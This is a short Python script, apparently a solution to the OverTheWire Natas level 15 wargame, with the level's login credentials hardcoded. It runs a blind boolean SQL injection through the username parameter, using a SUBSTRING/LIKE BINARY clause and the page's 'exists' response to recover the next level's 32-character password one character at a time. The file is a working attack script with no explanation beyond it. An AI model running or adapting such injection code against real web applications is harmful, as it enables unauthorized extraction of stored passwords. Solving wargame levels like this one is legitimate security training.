#!/usr/bin/python

__author__ = "bt3"

import requests
import string


def brute_force_password(LENGTH, AUTH, CHARS, SQL_URL1, SQL_URL2, KEYWORD):

        password = ''

        for i in range(1, LENGTH+1):
            for j in range (len(CHARS)):

                r = requests.get( ( SQL_URL1 + str(i) + SQL_URL2 + CHARS[j] ), auth=AUTH)
                print r.url

                if KEYWORD in r.text:
                        password += CHARS[j]
                        print("Password so far: " + password)
                        break

        return password



if __name__ == '__main__':

        # authorization: login and password
        AUTH = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')


        # BASE64 password and 32 bytes
        CHARS = string.ascii_letters + string.digits
        LENGTH = 32

        # crafted url option
        SQL_URL1 = 'http://natas15.natas.labs.overthewire.org?username=natas16" AND SUBSTRING(password,'
        SQL_URL2 = ',1) LIKE BINARY "'
        KEYWORD = 'exists'

        print(brute_force_password(LENGTH, AUTH, CHARS, SQL_URL1, SQL_URL2, KEYWORD))

